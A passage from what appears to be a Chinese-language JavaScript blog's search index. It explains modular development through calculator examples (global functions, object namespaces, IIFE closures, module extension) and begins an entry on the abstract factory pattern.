class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>模块化开发演变-全局函数<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">'x'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"opt"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"0"</span>&gt;</span>+<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>-<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span>*<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"3"</span>&gt;</span>/<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">'y'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">'cal'</span>&gt;</span>=<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">'result'</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">//定义计算函数</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x,y</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)+<span class="built_in">parseInt</span>(y);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">subtract</span>(<span class="params">x,y</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)-<span class="built_in">parseInt</span>(y);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params">x,y</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)*<span class="built_in">parseInt</span>(y);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">divide</span>(<span class="params">x,y</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)/<span class="built_in">parseInt</span>(y);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">//获取Dom</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oX = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oY = <span class="built_in">document</span>.getElementById(<span class="string">'y'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oOpt = <span class="built_in">document</span>.getElementById(<span class="string">'opt'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oCal = <span class="built_in">document</span>.getElementById(<span class="string">'cal'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oResult = <span class="built_in">document</span>.getElementById(<span class="string">'result'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">//为等号按钮添加单击事件</span></span></span><br><span class="line"><span class="javascript">oCal.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = oX.value;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> y = oY.value;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> opt = oOpt.value;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> result = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">switch</span>(opt)&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">case</span> <span class="string">'0'</span>:</span></span><br><span class="line"><span class="undefined">result = add(x,y);</span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">case</span> <span class="string">'1'</span>:</span></span><br><span class="line"><span class="undefined">result = subtract(x,y);</span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">case</span> <span class="string">'2'</span>:</span></span><br><span class="line"><span class="undefined">result = multiply(x,y);</span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">case</span> <span class="string">'3'</span>:</span></span><br><span class="line"><span class="undefined">resule = divide(x,y);</span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">oResult.value = result;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>全局函数这种编程方式很常见，但是不可取，无法保证全局变量不与其他模块的变量冲突。</p><h2 id="1-2-2对象命名空间"><a href="#1-2-2对象命名空间" class="headerlink" title="1.2.2对象命名空间"></a>1.2.2对象命名空间</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">       </span></span><br><span class="line"><span class="javascript"><span class="comment">//对象命名空间</span></span></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> calculator = &#123;&#125;;</span></span><br><span class="line"><span class="undefined">       </span></span><br><span class="line"><span class="javascript"><span class="comment">//定义计算函数</span></span></span><br><span class="line"><span class="undefined">calculator.add(x,y)&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)+<span class="built_in">parseInt</span>(y);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">calculator.subtract(x,y)&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)-<span class="built_in">parseInt</span>(y);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">calculator.multiply(x,y)&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)*<span class="built_in">parseInt</span>(y);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">calculator.divide(x,y)&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)/<span class="built_in">parseInt</span>(y);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">//获取Dom</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oX = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oY = <span class="built_in">document</span>.getElementById(<span class="string">'y'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oOpt = <span class="built_in">document</span>.getElementById(<span class="string">'opt'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oCal = <span class="built_in">document</span>.getElementById(<span class="string">'cal'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> oResult = <span class="built_in">document</span>.getElementById(<span class="string">'result'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">//为等号按钮添加单击事件</span></span></span><br><span class="line"><span class="javascript">oCal.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = oX.value;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> y = oY.value;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> opt = oOpt.value;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> result = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">switch</span>(opt)&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">case</span> <span class="string">'0'</span>:</span></span><br><span class="line"><span class="undefined">result = calculator.add(x,y);</span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">case</span> <span class="string">'1'</span>:</span></span><br><span class="line"><span class="undefined">result = calculator.subtract(x,y);</span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">case</span> <span class="string">'2'</span>:</span></span><br><span class="line"><span class="undefined">result = calculator.multiply(x,y);</span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">case</span> <span class="string">'3'</span>:</span></span><br><span class="line"><span class="undefined">resule = calculator.divide(x,y);</span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">oResult.value = result;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用于计算的4个函数的命名冲突问题解决了，但是如果再定义一个名为calculator的命名空间还是会报错，虽然减少了命名冲突的问题，但是命名冲突还是存在。另外还会出现子命名空间的情况。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">calculator.subcal = &#123;&#125;;</span><br><span class="line">calculator.subcal.foo = <span class="string">'bar'</span>;<span class="comment">//命名空间越来越长，代码可读性差</span></span><br></pre></td></tr></table></figure><h2 id="1-2-3-函数的作用域（闭包）"><a href="#1-2-3-函数的作用域（闭包）" class="headerlink" title="1.2.3 函数的作用域（闭包）"></a>1.2.3 函数的作用域（闭包）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">       </span><br><span class="line"><span class="comment">//利用匿名自执行函数形成的封闭的函数作用域空间，达到私有化的目的。</span></span><br><span class="line">       </span><br><span class="line">       <span class="keyword">var</span> calcultor = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)+<span class="built_in">parseInt</span>(y);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">subtract</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)-<span class="built_in">parseInt</span>(y);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)*<span class="built_in">parseInt</span>(y);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">divide</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)/<span class="built_in">parseInt</span>(y);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span>&#123;</span><br><span class="line">               add:add,</span><br><span class="line">               subtract:subtract,</span><br><span class="line">               multiply:multiply,</span><br><span class="line">               divide:divide</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Dom</span></span><br><span class="line"><span class="keyword">var</span> oX = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line"><span class="keyword">var</span> oY = <span class="built_in">document</span>.getElementById(<span class="string">'y'</span>);</span><br><span class="line"><span class="keyword">var</span> oOpt = <span class="built_in">document</span>.getElementById(<span class="string">'opt'</span>);</span><br><span class="line"><span class="keyword">var</span> oCal = <span class="built_in">document</span>.getElementById(<span class="string">'cal'</span>);</span><br><span class="line"><span class="keyword">var</span> oResult = <span class="built_in">document</span>.getElementById(<span class="string">'result'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为等号按钮添加单击事件</span></span><br><span class="line">oCal.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> x = oX.value;</span><br><span class="line"><span class="keyword">var</span> y = oY.value;</span><br><span class="line"><span class="keyword">var</span> opt = oOpt.value;</span><br><span class="line"><span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span>(opt)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'0'</span>:</span><br><span class="line">result = calculator.add(x,y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">result = calculator.subtract(x,y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">result = calculator.multiply(x,y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">resule = calculator.divide(x,y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">oResult.value = result;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>上述方法中，用于计算的4个方法被封装到了立即执行匿名函数中，添加返回值后，在全局可以通过“匿名函数.函数名（）”进行调用，这样有效的公开了公有方法，并且可以隐藏一些私有属性和元素，大部分第三方库都使用这种形式，例如jQuery。</p><h2 id="1-2-4-维护和扩展"><a href="#1-2-4-维护和扩展" class="headerlink" title="1.2.4 维护和扩展"></a>1.2.4 维护和扩展</h2><p>若现在需要添加取余方法，传统方式是在匿名函数中添加一个方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> calcultor = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parseInt</span>(x)+<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">subtract</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)-<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)*<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">divide</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)/<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mod</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)%<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span>&#123;</span><br><span class="line">                add:add,</span><br><span class="line">                subtract:subtract,</span><br><span class="line">                multiply:multiply,</span><br><span class="line">                divide:divide,</span><br><span class="line">                mod:mod</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)();</span><br></pre></td></tr></table></figure><p>试想一下，如果这个计算模块由第三方库提供，难道要修改源码？</p><p>其实可以通过参数的形式将原来的模块和第三方库传递出去。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传递参数cal</span></span><br><span class="line"><span class="keyword">var</span> calcultor = (<span class="function"><span class="keyword">function</span>(<span class="params">cal</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)+<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">subtract</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)-<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)*<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">divide</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)/<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mod</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">parseInt</span>(x)%<span class="built_in">parseInt</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            </span><br><span class="line">                cal.add = add;</span><br><span class="line">                cal.subtract = subtract;</span><br><span class="line">                cal.multiply = multiply;</span><br><span class="line">                cal.divide = divide;</span><br><span class="line">                <span class="keyword">return</span> cal;</span><br><span class="line">            </span><br><span class="line">        &#125;)(calculator||&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面的calculator已经把上面的给覆盖掉了</span></span><br><span class="line"><span class="comment">//注意：在进行扩展的时候，优先查找要扩展的对象是否已经存在</span></span><br><span class="line"><span class="keyword">var</span> calculator = (<span class="function"><span class="keyword">function</span>(<span class="params">cal</span>)</span>&#123;</span><br><span class="line">    cal.mod = <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x%y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(calculator||&#123;&#125;);</span><br><span class="line"><span class="comment">//当扩展该模块时，判断calculator是否存在，存在就使用存在的，不存在就重新创建</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Dom</span></span><br><span class="line"><span class="keyword">var</span> oX = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line"><span class="keyword">var</span> oY = <span class="built_in">document</span>.getElementById(<span class="string">'y'</span>);</span><br><span class="line"><span class="keyword">var</span> oOpt = <span class="built_in">document</span>.getElementById(<span class="string">'opt'</span>);</span><br><span class="line"><span class="keyword">var</span> oCal = <span class="built_in">document</span>.getElementById(<span class="string">'cal'</span>);</span><br><span class="line"><span class="keyword">var</span> oResult = <span class="built_in">document</span>.getElementById(<span class="string">'result'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为等号按钮添加单击事件</span></span><br><span class="line">oCal.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> x = oX.value;</span><br><span class="line"><span class="keyword">var</span> y = oY.value;</span><br><span class="line"><span class="keyword">var</span> opt = oOpt.value;</span><br><span class="line"><span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span>(opt)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'0'</span>:</span><br><span class="line">result = calculator.add(x,y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">result = calculator.subtract(x,y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">result = calculator.multiply(x,y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">result = calculator.divide(x,y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">oResult.value = result;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>把模块化思想带入编程中，可以解决命名冲突和文件依赖等问题，后面会介绍Node.js是一个高度模块化的平台。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>抽象工厂模式</title>
      <link href="2019/01/21/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
      <url>2019/01/21/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h1><p>抽象工厂模式：通过对类的工厂抽象使其业务用于对产品类簇的创建，而不负责创建某一类产品的实例。</p><p>JS中是没有直接的抽象类的，abstract是个保留字，但是还没有实现，因此我们需要在类的方法中抛出错误来模拟抽象类，如果继承的子类中没有覆写该方法而调用，就会抛出错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Car = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line">Car.prototype = &#123;</span><br><span class="line">    getPrice : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'抽象方法不能调用'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    getSpeed : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'抽象方法不能调用'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a 